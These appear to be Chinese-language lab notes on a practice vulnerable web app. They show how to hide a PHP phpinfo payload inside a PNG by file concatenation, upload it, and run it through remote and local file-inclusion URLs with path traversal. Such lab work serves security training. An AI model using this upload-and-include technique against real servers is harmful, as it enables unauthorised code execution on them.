




* dog.png 用小畫家產生 圖片不要太大



* 創test.php 

```
<?php phpinfo();?>
```





* cmd 合併
```
copy /b dog.png + test.php hack.jpg
```



需要結合 file inclusion 漏洞，因為最後上傳的是 jpg 檔案



file include (remote)
```
http://pika/vul/unsafeupload/uploads/2023/07/22/41588164bb412194440200978429.jpg
```
```
http://pika/vul/fileinclude/fi_remote.php?filename=http://pika/vul/unsafeupload/uploads/2023/07/22/41588164bb412194440200978429.jpg&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2
```



file include (local)
```
../../unsafeupload/uploads/2023/07/22/41588164bb412194440200978429.jpg&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2
```


```
http://pika/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/07/22/41588164bb412194440200978429.jpg&submit=%E9%80%81%E5%87%BA%E6%9F%A5%E8%A9%A2
```